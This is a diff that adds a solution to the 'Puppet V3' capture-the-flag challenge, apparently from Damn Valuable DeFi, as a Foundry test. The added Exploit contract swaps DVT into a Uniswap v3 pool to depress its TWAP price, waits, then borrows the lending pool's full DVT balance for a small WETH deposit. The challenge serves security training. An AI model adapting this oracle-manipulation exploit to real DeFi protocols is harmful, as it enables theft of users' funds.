@@ -11,6 +11,10 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
 
+import {OracleLibrary} from "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";
+import {IUniswapV3FlashCallback} from "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3FlashCallback.sol";
+import {IUniswapV3SwapCallback} from "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";
+
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -119,7 +123,36 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        // SYSTEM
+        // 1. There is a pool offering 1 million DVT tokens for borrowing against 3 times the value of DVT in WETH
+        // 2. It reads the TWAP price of DVT in WETH from a Uniswap v3 pool
+        // 3. The period for TWAP calculation is 10 minutes, and the cardinatlity of the pool is 40
+        // 3. The uniswap v3 pool has 100 DVT and 100 WETH in liquidity
+        // 4. The player has 110 DVT and 1 WETH
+
+        // token0 is DVT
+        // token1 is WETH
+
+        // THE CODE BELOW LOWERS THE TWAP PRICE OF DVT IN WETH, BUT it is not enough
+        // find how to influence it more
+
+        // Get the instance of the Uniswap v3 pool
+        IUniswapV3Pool uniswap = lendingPool.uniswapV3Pool();
+
+        // Create the exploit contract to interact with pools
+        Exploit exploit = new Exploit(lendingPool, uniswap, token, weth);
+
+        // Send tokens to the exploit contract
+        token.transfer(address(exploit), 110e18);
+
+        // Crash the price of DVT
+        exploit.swap(int256(PLAYER_INITIAL_TOKEN_BALANCE));
+
+        // Wait until the TWAP price of DVT drops down (this level allows for 115 second from initialBlockTimestamp)
+        skip(114 seconds);
+
+        // Take all the DVT from the lending pool and send it to the recovery account
+        exploit.borrow(recovery);
     }
 
     /**
@@ -133,5 +166,43 @@ contract PuppetV3Challenge is Test {
 
     function _encodePriceSqrt(uint256 reserve1, uint256 reserve0) private pure returns (uint160) {
         return uint160(FixedPointMathLib.sqrt((reserve1 * 2 ** 96 * 2 ** 96) / reserve0));
+    }
+}
+
+contract Exploit is IUniswapV3SwapCallback {
+    PuppetV3Pool pool;
+    IUniswapV3Pool uniswap;
+    DamnValuableToken token;
+    WETH weth;
+
+    uint256 constant LENDING_POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
+    uint160 constant MIN_SQRT_RATIO = 4295128739;
+
+    constructor(PuppetV3Pool _pool, IUniswapV3Pool _uniswap, DamnValuableToken _token, WETH _weth) {
+        pool = _pool;
+        uniswap = _uniswap;
+        token = _token;
+        weth = _weth;
+    }
+
+    // Take all the DVT from PuppetV3Pool for a fraction of initial deposit required
+    function borrow(address recovery) public {
+        // Approve the pool to take the required amount of WETH as deposit
+        weth.approve(address(pool), pool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE));
+        // Borrow all the DVT from the pool
+        pool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
+        // Transfer the DVT to the recovery address
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
+    }
+
+    // Function to swap DVT for WETH on the Uniswap V3 pool to decrease its price
+    function swap(int256 amountDVT) public {
+        uniswap.swap(address(this), true, amountDVT, MIN_SQRT_RATIO + 1, "");
+    }
+
+    // Callback function called during UniswapV3Pool::swap
+    function uniswapV3SwapCallback(int256 amount0Delta, int256, bytes calldata) external {
+        token.transfer(address(uniswap), uint256(amount0Delta));
     }
 }
